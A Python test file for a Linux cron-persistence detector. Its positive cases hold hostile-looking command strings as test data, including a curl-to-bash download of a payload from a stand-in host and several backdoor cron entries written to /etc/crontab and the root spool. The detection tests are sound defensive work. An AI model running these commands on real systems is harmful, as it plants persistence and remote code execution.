from src.detection.linux_cron_persistence_detector import (detect_linux_cron_persistence,)
from src.detection.linux_detection_context import LinuxDetectionContext
from src.models.linux_process_execution import LinuxProcessExecution


class FakeLinuxEvent:
    def __init__(
        self,
        command="",
        process="",
        user="root",
        source_ip="",
        hostname="ubuntu-server",
        timestamp="Jul 7 10:00:01",
        message="",
        raw_log="",
    ):
        self.command = command
        self.process = process
        self.user = user
        self.source_ip = source_ip
        self.hostname = hostname
        self.timestamp = timestamp
        self.message = message
        self.raw_log = raw_log


def create_execution(
    command: str = "",
    process: str = "",
    user: str = "root",
    source_ip: str = "",
    message: str = "",
) -> LinuxProcessExecution:
    event = FakeLinuxEvent(
        command=command,
        process=process,
        user=user,
        source_ip=source_ip,
        message=message,
    )

    context = LinuxDetectionContext.from_event(event)

    return LinuxProcessExecution.from_context(context)


def test_detect_crontab_edit():
    executions = [create_execution(command="crontab -e")]

    findings = detect_linux_cron_persistence(executions)

    assert len(findings) == 1
    assert findings[0].title == ("Linux Cron Persistence Activity Detected")
    assert findings[0].severity == "high"
    assert findings[0].source == "Linux Host Detection"


def test_detect_etc_crontab_modification():
    executions = [create_execution(command=(
        'echo "@reboot /tmp/backdoor.sh" >> /etc/crontab'))]

    findings = detect_linux_cron_persistence(executions)

    assert len(findings) == 1


def test_detect_cron_d_file_creation():
    executions = [create_execution(command=(
        "cp persistence-job " "/etc/cron.d/persistence-job"))]

    findings = detect_linux_cron_persistence(executions)

    assert len(findings) == 1


def test_detect_spool_cron_modification():
    executions = [create_execution(command=(
        "echo '* * * * * /tmp/run.sh' >> /var/spool/cron/root"))]

    findings = detect_linux_cron_persistence(executions)

    assert len(findings) == 1


def test_detect_reboot_download_payload():
    executions = [create_execution(command=(
        'echo "@reboot curl http://example.test/payload | bash" >> /tmp/cron.txt'))]

    findings = detect_linux_cron_persistence(executions)

    assert len(findings) == 1


def test_detect_daily_python_payload():
    executions = [create_execution(command=(
        'echo "@daily python3 /dev/shm/update.py" >> /tmp/cron.txt'))]

    findings = detect_linux_cron_persistence(executions)

    assert len(findings) == 1


def test_ignore_crontab_listing():
    executions = [create_execution(command="crontab -l")]

    findings = detect_linux_cron_persistence(executions)

    assert findings == []


def test_ignore_normal_cron_log_message():
    executions = [create_execution(message=("CRON session opened for user root"))]

    findings = detect_linux_cron_persistence(executions)

    assert findings == []


def test_ignore_normal_command():
    executions = [create_execution(command="/usr/bin/updatedb")]

    findings = detect_linux_cron_persistence(executions)

    assert findings == []


def test_ignore_empty_executions():
    findings = detect_linux_cron_persistence([])

    assert findings == []